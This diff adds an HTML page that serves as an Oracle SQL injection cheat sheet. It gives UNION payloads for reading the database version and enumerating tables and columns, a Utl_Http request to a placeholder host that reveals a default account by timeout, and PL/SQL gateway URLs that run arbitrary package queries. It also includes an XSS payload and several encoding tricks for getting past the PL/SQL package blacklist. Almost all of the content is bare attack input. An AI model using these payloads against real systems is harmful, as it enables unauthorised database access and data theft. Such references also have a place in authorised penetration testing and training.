@@ -1,0 +1,41 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Data extraction</title>
+</head><body><b><span style="font-size: 10pt">Oracle version<br/>
+</span></b><span style="font-size: 10pt"><br/>
+Using UNION<br/>
+</span><tt>' UNION SELECT banner,NULL,NULL FROM v$version--</tt><span style="font-size: 10pt"><b><br/>
+</b></span><span style="font-size: 10pt"><b><br/>
+Basic extraction<br/>
+</b></span><br/>
+Print table names and column names<br/>
+AAA'<tt>%20union%20select%20table_name,column_name,null,null,null%20from%20all_tab_ columns--</tt><b><span style="font-size: 10pt"><br/>
+</span></b><br/>
+Timeout if the default Oracle account DBSNMP exists<br/>
+<tt>SELECT 'a'||Utl_Http.request('http://madeupserver.com') FROM dual WHERE (SELECT username FROM all_users WHERE username = 'DBSNMP') = 'DBSNMP'</tt><span style="font-size: 10pt"><b><br/>
+</b></span><span style="font-size: 10pt"><b><br/>
+Output concatenation<br/>
+</b></span><tt><br/>
+</tt><tt>SELECT table_name||':'||column_name FROM all_tab_columns</tt><b><span style="font-size: 10pt"><br/>
+</span></b><b><span style="font-size: 10pt"><br/>
+</span></b><span style="font-size: 10pt"><b>Accessing Arbitrary PL/SQL Packages in the Database</b><br/>
+<tt><br/>
+http:/www.example.com/pls/dad/OWA_UTIL.CELLSPRINT?P_THEQUERY=<i>SELECT+USERNAME+FROM+ALL_USERS</i><br/>
+http:/www.example.com/pls/dad/CXTSYS.DRILOAD.VALIDATE_STMT?SQLSTMT=<i>SELECT+1+FROM+DUAL</i><br/>
+<br/>
+</tt></span><b>XSS <span style="font-size: 10pt">(older Oracle versions)</span></b><br/>
+<tt><br/>
+http:/www.example.com/pls/dad/HTP.PRINT?CBUF=<i>&lt;script&gt;alert(‘XSS’)&lt;/script&gt;</i><br/>
+<br/>
+</tt><b>Bypassing PL/SQL packages blacklist</b><br/>
+<tt><br/>
+http:/www.example.com/pls/dad/%0ASYS.PACKAGE.PROC<br/>
+http:/www.example.com/pls/dad/%20SYS.PACKAGE.PROC<br/>
+http:/www.example.com/pls/dad/%09SYS.PACKAGE.PROC<br/>
+http:/www.example.com/pls/dad/&lt;&lt;LBL&gt;&gt;SYS.PACKAGE.PROC (LBL is name of GOTO statement)<br/>
+http:/www.example.com/pls/dad/”SYS”.PACKAGE.PROC (not working on 10g)<br/>
+http:/www.example.com/pls/dad/S%FFS.PACKAGE.PROC<br/>
+http:/www.example.com/pls/dad/S%AFS.PACKAGE.PROC<br/>
+http:/www.example.com/pls/dad/%5CSYS.PACKAGE.PROC<br/>
+</tt></body></html>
